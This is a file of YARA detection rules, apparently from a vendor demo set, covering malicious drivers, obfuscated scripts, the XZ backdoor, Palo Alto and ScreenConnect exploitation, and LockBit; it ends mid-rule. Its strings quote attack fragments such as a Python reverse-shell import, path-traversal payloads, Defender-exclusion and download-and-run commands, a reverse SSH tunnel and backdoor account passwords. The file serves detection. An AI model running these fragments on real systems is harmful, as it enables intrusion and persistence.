00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570041004e0020005400720061006e00730070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e0031003100370032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e0031003100370032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00770061006e00740064002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f00660074002000570069006e0064006f007700730020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00770061006e00740064002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_30E0_RID3F99 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:26:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310033002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Microsoftcorporation_Wantdsys_Microsoftwindowsoperatingsystem_6908_RID45FB : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - wantd_2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:59:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570041004e0020005400720061006e00730070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003900330038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003900330038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00770061006e00740064002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f00660074002000570069006e0064006f007700730020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00770061006e00740064002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Microsoftcorporation_Srvnetsys_Microsoftwindowsoperatingsystem_F6C3_RID469A : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WinTapix.sys, SRVNET2.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:25:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0053006500720076006500720020004e006500740077006f0072006b0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e00310038003300360032002e0036003900330020002800570069006e004200750069006c0064002e003100360030003100300031002e00300038003000300029 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e00310038003300360032002e003600390033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005300520056004e004500540032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f0066007400ae002000570069006e0064006f0077007300ae0020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005300520056004e004500540032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Microsoftcorporation_Wantdsys_Microsoftwindowsoperatingsystem_81C7_RID4607 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - wantd_3.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:01:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570041004e0020005400720061006e00730070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e003900330038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e003900330038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00770061006e00740064002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f00660074002000570069006e0064006f007700730020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00770061006e00740064002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_773B_RID2BF8 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 09:29:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0031002e0030 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d002000320030003100370020 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Sensecorp_7F45_RID300C : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Sense5Ext.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 12:23:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530065006e0073006500350020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530065006e00730065003500200043004f00520050 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0036002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0036002e0030002e0030 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320032 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Microsoftcorporation_Ndislansys_Microsoftwindowsoperatingsystem_B0EB_RID46E8 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ndislan.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:38:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d00530020004c0041004e0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e0031003400320031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e0031003400320031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e006400690073006c0061006e002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f0066007400ae002000570069006e0064006f0077007300ae0020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e006400690073006c0061006e002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      all of them\n}\n\nrule SUSP_BAT_OBFUSC_Jul24_1_RID2E33 : DEMO FILE OBFUS SCRIPT SUSP T1027 {\n   meta:\n      description = \"Detects indicators of obfuscation in Windows Batch files\"\n      author = \"Florian Roth\"\n      reference = \"https://x.com/0xToxin/status/1811656147943752045\"\n      date = \"2024-07-12 11:04:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, OBFUS, SCRIPT, SUSP, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"&&set \" \n   condition: \n      filesize < 300KB and uint32 ( 0 ) == 0x20746573 and $s1 in ( 0 .. 32 )\n}\n\nrule SUSP_BAT_OBFUSC_Jul24_2_RID2E34 : DEMO FILE OBFUS SCRIPT SUSP T1027 {\n   meta:\n      description = \"Detects indicators of obfuscation in Windows Batch files\"\n      author = \"Florian Roth\"\n      reference = \"https://x.com/0xToxin/status/1811656147943752045\"\n      date = \"2024-07-12 11:04:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, OBFUS, SCRIPT, SUSP, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"&&set \" \n   condition: \n      filesize < 300KB and #s1 > 30 and uint16 ( filesize - 2 ) == 0x0a0d and uint8 ( filesize - 3 ) == 0x25\n}\n\nrule SUSP_BAT_OBFUSC_Jul24_3_RID2E35 : DEMO OBFUS SCRIPT SUSP T1027 {\n   meta:\n      description = \"Detects indicators of obfuscation in Windows Batch files\"\n      author = \"Florian Roth\"\n      reference = \"https://x.com/0xToxin/status/1811656147943752045\"\n      date = \"2024-07-12 11:04:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, OBFUS, SCRIPT, SUSP, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"% \\\\\\\\%\" \n      $s2 = { 3D ?? 26 26 73 65 74 20 } \n   condition: \n      filesize < 300KB and all of them\n}\n\nrule APT_MAL_APT27_Rshell_Jul24_1_RID3025 : APT DEMO FILE G0027 MAL T1070_003 {\n   meta:\n      description = \"Detects RSHELL / SYSUPDATE backdoor used by APT27\"\n      author = \"Florian Roth\"\n      reference = \"https://x.com/bfv_bund/status/1811364839656185985?s=12&t=C0_T_re0wRP_NfKa27Xw9w\"\n      date = \"2024-07-11 12:27:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0433edfad648e1e29be54101abaded690302dc7e49ad916cfbbddf99b3ade12c\"\n      hash2 = \"10bb89fdf25c88d3c5623e8d68573124c9a42549750014e3675e2ca342aeba4a\"\n      hash3 = \"2603e1f61363451891c97b0c4ce8acfbfb680d3df4282f9d151ecce3a5679616\"\n      tags = \"APT, DEMO, FILE, G0027, MAL, T1070_003\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $a1 = \"%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%\" ascii\n      $a2 = \"/proc/self/exe\" ascii\n      $s1 = \"HISTFILE\" ascii fullword\n      $s2 = \"/tmp/guid\" ascii fullword\n      $sop1 = { e8 ?? ?? ?? ?? c7 43 04 00 00 00 00 8b 3b 85 ff 7e 2? e8 ?? ?? 0? 00 85 c0 7e 0? } \n      $sop2 = { c7 43 04 00 00 00 00 8b 3b 85 ff 7e 2? e8 ?? ?? 0? 00 85 c0 7e 0? f7 d8 } \n   condition: \n      ( uint32be ( 0 ) == 0x7f454c46 or ( uint32be ( 0 ) == 0xcafebabe and uint32be ( 4 ) < 0x20 ) or uint32 ( 0 ) == 0xfeedface or uint32 ( 0 ) == 0xfeedfacf ) and filesize < 2MB and all of ( $a* ) and 2 of ( $s* ) or 3 of ( $s* )\n}\n\nrule SUSP_LNX_Base64_Download_Exec_Apr24_RID3354 : DEMO LINUX SCRIPT SUSP T1105 T1132_001 {\n   meta:\n      description = \"Detects suspicious base64 encoded shell commands used for downloading and executing further stages\"\n      author = \"Paul Hager\"\n      reference = \"Internal Research\"\n      date = \"2024-04-18 14:43:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, LINUX, SCRIPT, SUSP, T1105, T1132_001\"\n      minimum_yara = \"4.0.0\"\n      \n   strings:\n      $sa1 = \"curl http\" base64\n      $sa2 = \"wget http\" base64\n      $sb1 = \"chmod 777 \" base64\n      $sb2 = \"/tmp/\" base64\n   condition: \n      1 of ( $sa* ) and all of ( $sb* )\n}\n\nrule SUSP_LNX_Base64_Exec_Apr24_RID2FBD : CVE_2024_3400 DEMO LINUX SCRIPT SUSP T1105 T1132_001 {\n   meta:\n      description = \"Detects suspicious base64 encoded shell commands (as seen in Palo Alto CVE-2024-3400 exploitation)\"\n      author = \"Christian Burkard\"\n      reference = \"Internal Research\"\n      date = \"2024-04-18 12:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-21\"\n      id = \"2da3d050-86b0-5903-97eb-c5f39ce4f3a3\"\n      tags = \"CVE_2024_3400, DEMO, LINUX, SCRIPT, SUSP, T1105, T1132_001\"\n      minimum_yara = \"4.0.0\"\n      \n   strings:\n      $s1 = \"curl http://\" base64\n      $s2 = \"wget http://\" base64\n      $s3 = \";chmod 777 \" base64\n      $mirai = \"country=\" \n      $fp1 = \"<html\" \n      $fp2 = \"<?xml\" \n   condition: \n      filesize < 800KB and 1 of ( $s* ) and not $mirai and not 1 of ( $fp* )\n}\n\nrule SUSP_PY_Import_Statement_Apr24_1_RID32CA : DEMO SCRIPT SUSP T1059_006 {\n   meta:\n      description = \"Detects suspicious Python import statement and socket usage often found in Python reverse shells\"\n      author = \"Florian Roth\"\n      reference = \"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/\"\n      date = \"2024-04-15 14:20:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"import sys,socket,os,pty;s=socket.socket(\" \n   condition: \n      1 of them\n}\n\nrule EXPL_PaloAlto_CVE_2024_3400_Apr24_1_RID31C7 : CVE_2024_3400 DEMO EXPLOIT {\n   meta:\n      description = \"Detects characteristics of the exploit code used in attacks against Palo Alto GlobalProtect CVE-2024-3400\"\n      author = \"Florian Roth\"\n      reference = \"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/\"\n      date = \"2024-04-15 13:37:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2024_3400, DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SESSID=../../../../opt/panlogs/\" \n      $x2 = \"SESSID=./../../../../opt/panlogs/\" \n      $sa1 = \"SESSID=../../../../\" \n      $sa2 = \"SESSID=./../../../../\" \n      $sb2 = \"${IFS}\" \n   condition: \n      1 of ( $x* ) or ( 1 of ( $sa* ) and $sb2 )\n}\n\nrule SUSP_OBFUSC_SH_Indicators_Mar24_1_RID325B : DEMO FILE OBFUS SCRIPT SUSP T1027 {\n   meta:\n      description = \"Detects characteristics found in obfuscated script (used in the backdoored XZ package, but could match on others, too)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.openwall.com/lists/oss-security/2024/03/29/4/1\"\n      date = \"2024-04-06 14:01:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, OBFUS, SCRIPT, SUSP, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"eval $\" \n   condition: \n      uint8 ( 1 ) == 0x3d and $s1 in ( filesize - 20 .. filesize )\n}\n\nrule BCKDR_XZUtil_Script_CVE_2024_3094_Mar24_1_RID3402 : CVE_2024_3094 DEMO SCRIPT {\n   meta:\n      description = \"Detects make file and script contents used by the backdoored XZ library (xzutil) CVE-2024-3094.\"\n      author = \"Florian Roth\"\n      reference = \"https://www.openwall.com/lists/oss-security/2024/03/29/4\"\n      date = \"2024-03-30 15:12:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2024_3094, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/bad-3-corrupt_lzma2.xz | tr \" ascii\n      $x2 = \"/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|\" ascii\n      $x3 = \"eval $zrKcKQ\" ascii\n   condition: \n      1 of them\n}\n\nrule BCKDR_XZUtil_Binary_CVE_2024_3094_Mar24_1_RID33F2 : CVE_2024_3094 DEMO FILE {\n   meta:\n      description = \"Detects injected code used by the backdoored XZ library (xzutil) CVE-2024-3094.\"\n      author = \"Florian Roth\"\n      reference = \"https://www.openwall.com/lists/oss-security/2024/03/29/4\"\n      date = \"2024-03-30 15:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"319feb5a9cddd81955d915b5632b4a5f8f9080281fb46e2f6d69d53f693c23ae\"\n      hash2 = \"605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4\"\n      hash3 = \"8fa641c454c3e0f76de73b7cc3446096b9c8b9d33d406d38b8ac76090b0344fd\"\n      tags = \"CVE_2024_3094, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 48 8d 7c 24 08 f3 ab 48 8d 44 24 08 48 89 d1 4c 89 c7 48 89 c2 e8 ?? ?? ?? ?? 89 c2 } \n      $op2 = { 31 c0 49 89 ff b9 16 00 00 00 4d 89 c5 48 8d 7c 24 48 4d 89 ce f3 ab 48 8d 44 24 48 } \n      $op3 = { 4d 8b 6c 24 08 45 8b 3c 24 4c 8b 63 10 89 85 78 f1 ff ff 31 c0 83 bd 78 f1 ff ff 00 f3 ab 79 07 } \n      $xc1 = { F3 0F 1E FA 55 48 89 F5 4C 89 CE 53 89 FB 81 E7 00 00 00 80 48 83 EC 28 48 89 54 24 18 48 89 4C 24 10 } \n   condition: \n      uint16 ( 0 ) == 0x457f and ( all of ( $op* ) or $xc1 )\n}\n\nrule BCKDR_XZUtil_KillSwitch_CVE_2024_3094_Mar24_1_RID358B : CVE_2024_3094 DEMO {\n   meta:\n      description = \"Detects kill switch used by the backdoored XZ library (xzutil) CVE-2024-3094.\"\n      author = \"Florian Roth\"\n      reference = \"https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01?permalink_comment_id=5006558#gistcomment-5006558\"\n      date = \"2024-03-30 16:17:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2024_3094, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"yolAbejyiejuvnup=Evjtgvsh5okmkAvj\" \n   condition: \n      $x1\n}\n\nrule SUSP_ScreenConnect_User_PoC_Com_Unused_Feb24_RID3767 : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious ScreenConnect user with poc.com email address, which is a sign of exploitation of the ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability with the POC released by WatchTower and the account wasn't actually used yet to login\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc/blob/45e5b2f699a4d8f2d59ec3fc79a2e3c99db71882/watchtowr-vs-ConnectWise_2024-02-21.py#L53\"\n      date = \"2024-02-23 17:37:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<Users xmlns:xsi=\" \n      $a2 = \"<CreationDate>\" \n      $s1 = \"@poc.com</Email>\" \n      $s2 = \"<LastLoginDate>0001\" \n   condition: \n      filesize < 200KB and all of ( $a* ) and all of ( $s* )\n}\n\nrule SUSP_ScreenConnect_User_PoC_Com_Used_Feb24_RID3684 : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious ScreenConnect user with poc.com email address, which is a sign of exploitation of the ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability with the POC released by WatchTower and the account was already used yet to login\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc/blob/45e5b2f699a4d8f2d59ec3fc79a2e3c99db71882/watchtowr-vs-ConnectWise_2024-02-21.py#L53\"\n      date = \"2024-02-23 16:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<Users xmlns:xsi=\" \n      $a2 = \"<CreationDate>\" \n      $s1 = \"@poc.com</Email>\" \n      $f1 = \"<LastLoginDate>0001\" \n   condition: \n      filesize < 200KB and all of ( $a* ) and $s1 and not 1 of ( $f* )\n}\n\nrule SUSP_ScreenConnect_Exploitation_Artefacts_Feb24_RID3912 : DEMO SCRIPT SUSP T1136 T1218_011 {\n   meta:\n      description = \"Detects post exploitation indicators observed by HuntressLabs in relation to the ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability that allows an Authentication Bypass\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 18:48:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1136, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x01 = \"-c foreach ($disk in Get-WmiObject Win32_Logicaldisk){Add-MpPreference -ExclusionPath $disk.deviceid}\" \n      $x02 = \".msi c:\\\\mpyutd.msi\" \n      $x03 = \"/MyUserName_$env:UserName\" \n      $x04 = \" -OutFile C:\\\\Windows\\\\Help\\\\\" \n      $x05 = \"/Create /TN \\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\Wininet\\\\\\\\UserCache_\" \n      $x06 = \"$e = $r + \\\"ssh.exe\\\"\" \n      $x07 = \"Start-Process -f $e -a $args -PassThru -WindowStyle Hidden).Id\" \n      $x08 = \"-R 9595:localhost:3389 -p 443 -N -oStrictHostKeyChecking=no \" \n      $x09 = \"chromeremotedesktophost.msi', $env:ProgramData+\" \n      $x10 = \"9595; iwr -UseBasicParsing \" \n      $x11 = \"curl  https://cmctt.]com/pub/media/wysiwyg/\" \n      $x12 = \":8080/servicetest2.dll\" \n      $x13 = \"/msappdata.msi c:\\\\mpyutd.msi\" \n      $x14 = \"/svchost.exe -OutFile \" \n      $x15 = \"curl http://minish.wiki.gd\" \n      $x16 = \" -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile \" \n      $x17 = \"rundll32.exe' -Headers @\" \n      $x18 = \"/nssm.exe' -Headers @\" \n      $x19 = \"c:\\\\programdata\\\\update.dat UpdateSystem\" \n      $x20 = \"::size -eq 4){\\\\\\\"TVqQAA\" ascii wide\n      $x21 = \"::size -eq 4){\\\"TVqQAA\" ascii wide\n      $x22 = \"-nop -c [System.Reflection.Assembly]::Load(([WmiClass]'root\\\\cimv2:System_\" \n      $xp0 = \"/add default test@2021! /domain\" \n      $xp1 = \"/add default1 test@2021! /domain\" \n      $xp2 = \"oldadmin Pass8080!!\" \n      $xp3 = \"temp 123123qwE /add \" \n      $xp4 = \"oldadmin \\\"Pass8080!!\\\"\" \n      $xp5 = \"nssm set xmrig AppDirectory \" \n   condition: \n      1 of ( $x* )\n}\n\nrule SUSP_Command_Line_Combos_Feb24_2_RID3286 : DEMO SCRIPT SUSP {\n   meta:\n      description = \"Detects suspicious command line combinations often found in post exploitation activities\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 14:08:51\"\n      score = 45\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \" | iex\" \n      $sa2 = \"iwr -UseBasicParsing \" \n   condition: \n      filesize < 2MB and all of them\n}\n\nrule MAL_SUSP_RANSOM_LockBit_RansomNote_Feb24_RID3502 : CRIME DEMO MAL RANSOM SUSP {\n   meta:\n      description = \"Detects the LockBit ransom note file 'LockBit-DECRYPT.txt' which is a sign of a LockBit ransomware infection\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 15:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CRIME, DEMO, MAL, RANSOM, SUSP\"\n      minimum_yara = 